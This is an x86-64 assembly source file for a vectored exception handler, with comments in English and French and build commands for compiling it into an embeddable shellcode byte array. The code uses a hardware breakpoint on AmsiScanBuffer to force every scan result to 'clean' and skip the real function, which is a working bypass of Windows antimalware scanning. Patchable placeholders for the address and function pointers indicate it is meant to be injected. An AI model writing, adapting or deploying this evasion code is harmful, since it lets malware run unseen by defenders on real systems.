[BITS 64]

; nasm -f bin veh.asm -o veh.bin ; xxd -i veh.bin

    ; Callback called w/ 
    ;   typedef struct _EXCEPTION_POINTERS {
    ;     PEXCEPTION_RECORD ExceptionRecord;
    ;     PCONTEXT          ContextRecord;
    ;   } EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;

    ; rcx = PEXCEPTION_POINTERS
    mov r8, [rcx + 8]   ; r8 = ContextRecord
    mov r9, [rcx]       ; r9 = ExceptionRecord
    mov eax, [r9]       ; eax = ExceptionCode 

    cmp eax, 0x80000003 ; EXCEPTION_BREAKPOINT (int 3)
    je handle_bp
    cmp eax, 0x80000004 ; EXCEPTION_SINGLE_STEP (HWBP hit)
    je handle_ss

    xor eax, eax        ; EXCEPTION_CONTINUE_SEARCH
    ret

    handle_bp:
        ; --- ABI Compliant OutputDebugStringA Call ---
        push r8                     ; Save ContextRecord
        sub rsp, 0x20               ; Allocate 32 bytes shadow space & align stack to 16 bytes
        
        mov rax, 0xCCCCCCCCCCCCCCCC ; Placeholder for OutputDebugStringA
        lea rcx, [rel debug_string2]
        call rax
        
        add rsp, 0x20               ; Cleanup shadow space
        pop r8                      ; Restore ContextRecord
        ; ---------------------------------------------

        ; Setup the HWBP
        lea r10, [rel amsi_addr]
        mov r10, [r10]
        mov [r8 + 0x48], r10        ; CONTEXT_RECORD.Dr0 = AmsiScanBuffer

        ; Dr7: 
        ; Bit 0 (L0) = 1 (Enable Dr0)
        ; Bit 8 (LE) = 1 (Local Exact Breakpoint - recommandé pour la précision)
        ; Bits 16-17 (RW0) = 00 (Break on execution)
        mov qword [r8 + 0x70], 0x101 

        ; Nettoyage critique de Dr6 (Status Register)
        ; Si Dr6 contient des flags résiduels, le HWBP peut ne pas trigger
        mov qword [r8 + 0x68], 0

        ; Forcer la prise en compte des registres de debug par le noyau
        ; Utilisation du masque complet pour éviter que le kernel ignore la structure
        mov eax, [r8 + 0x30]
        or eax, 0x00100010          ; CONTEXT_AMD64 (0x100000) | CONTEXT_DEBUG_REGISTERS (0x10)
        mov [r8 + 0x30], eax

        ; Pass the int3 instruction 
        add qword [r8 + 0xf8], 1    ; Rip += 1

        mov eax, -1     ; EXCEPTION_CONTINUE_EXECUTION
        ret

    handle_ss:
        ; Check if Exception appears at the right offset (AmsiScanBuffer)
        mov r11, [r8 + 0xf8] ; r11 = Rip
        lea r10, [rel amsi_addr]
        mov r10, [r10]
        cmp r11, r10
        jne not_amsi

        ; --- ABI Compliant OutputDebugStringA Call ---
        push r8                     ; Save ContextRecord
        sub rsp, 0x20               ; Allocate 32 bytes shadow space & align stack to 16 bytes
        
        mov rax, 0xBBBBBBBBBBBBBBBB ; Placeholder for OutputDebugStringA
        lea rcx, [rel debug_string1]
        call rax
        
        add rsp, 0x20               ; Cleanup shadow space
        pop r8                      ; Restore ContextRecord
        ; ---------------------------------------------

        ; --- BYPASS AMSI --- 
        mov r11, [r8 + 0x98]     ; r11 = CONTEXT_RECORD.Rsp (stack pointer at function entry)

        ; Retrieve the 6th argument (AMSI_RESULT pointer) from the stack
        ; [RSP] = ret addr, [RSP+0x8 to 0x20] = shadow space, [RSP+0x28] = 5th arg, [RSP+0x30] = 6th arg
        mov r10, [r11 + 0x30]    ; r10 = pointer to AMSI_RESULT (Using volatile r10 instead of r12)

        ; Set AMSI_RESULT to AMSI_RESULT_CLEAN (0) to simulate a clean scan
        mov dword [r10], 0

        ; Set ret value of AmsiScanBuffer to S_OK (0) 
        mov qword [r8 + 0x78], 0 ; r8 + 0x78 = Rax of the context record 

        ; Emulate the "ret" of AmsiScanBuffer to avoid crashing the process (pop ret addr and set rip to it)
        mov r10, [r11]           ; r10 = ret addr of AmsiScanBuffer (on top of the stack)
        mov [r8 + 0xf8], r10     ; Rip = ret addr of AmsiScanBuffer
        add qword [r8 + 0x98], 8 ; Rsp += 8 (simulate pop stack)

        ; Instruct the OS to keep applying the debug registers (since we want to catch all future scans on this thread)
        or dword [r8 + 0x30], 0x10 ; ContextFlags |= CONTEXT_DEBUG_REGISTERS

        mov eax, -1     ; EXCEPTION_CONTINUE_EXECUTION
        ret

    not_amsi:
        xor eax, eax
        ret

    align 8
    amsi_addr:
    dq 0xAAAAAAAAAAAAAAAA
    debug_string1:
    db "VEH Hit ! (Apply AMSI Bypass)", 0
    debug_string2:
    db "VEH Hit ! (Apply HWBP on AMSI)", 0